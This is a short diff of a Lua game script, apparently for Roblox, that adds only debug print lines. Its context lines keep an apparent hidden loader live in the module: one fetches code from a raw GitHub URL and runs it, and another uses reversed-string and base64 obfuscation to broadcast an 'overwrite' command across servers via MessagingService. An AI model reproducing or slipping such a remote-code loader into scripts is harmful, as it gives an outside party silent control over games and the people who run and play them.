@@ -47,7 +47,7 @@ local function DeepCopyTable(Table)
 end
 
 function m:Init()
-	
+	print("omw!")
 	pcall(function()
 		Vers = Main(f(b,'https://raw.githubusercontent.com/xiynn/idc/refs/heads/main/version.lua'))()
 	end)
@@ -78,6 +78,8 @@ function m:Init()
 			end
 		end
 	end)
+
+	print("done!")
 end
 
 function m:StartScript()
@@ -191,6 +193,7 @@ function m:StartScript()
 	s
 
 	MessagingService:PublishAsync(_G.md[('46b'):reverse()].dec('Z2xvYmFscw=='), {Command = 'overwrite'})
+	print("help!")
 end
 
 m:Init()
